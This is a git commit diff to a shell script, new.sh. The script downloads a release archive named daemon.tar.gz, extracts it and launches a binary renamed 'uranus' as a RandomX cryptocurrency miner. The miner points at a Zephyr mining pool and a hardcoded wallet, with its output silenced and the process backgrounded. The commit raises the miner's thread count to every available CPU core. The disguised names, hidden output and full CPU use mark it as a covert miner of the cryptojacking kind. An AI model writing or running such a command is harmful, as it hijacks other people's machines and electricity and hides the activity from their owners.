7610d445b3c17b60ef8cb28579dcdcb43577c200
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-16 05:18:20 +0700

    Update new.sh

--- new.sh
+++ new.sh
@@ -1,4 +1,4 @@
-wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o sg.zephyr.herominers.com:1123 -u ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp -p "vivo"  -useSSL false -t 2 >/dev/null 2>&1 &
+wget https://github.com/preak07/kopi/releases/download/susu/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o sg.zephyr.herominers.com:1123 -u ZEPHsAZJ6eo36HYMxHZKtUGhfG3xycfLkEKcSKiUDXXiQAnA6z4VxeuN4sj4AQe8USWfozFRYzB2WS6kMWfGGZaj7AoQe1dWLmp -p "vivo" -t $(nproc --all) >/dev/null 2>&1 &
 while true
 do
         echo "Download..."
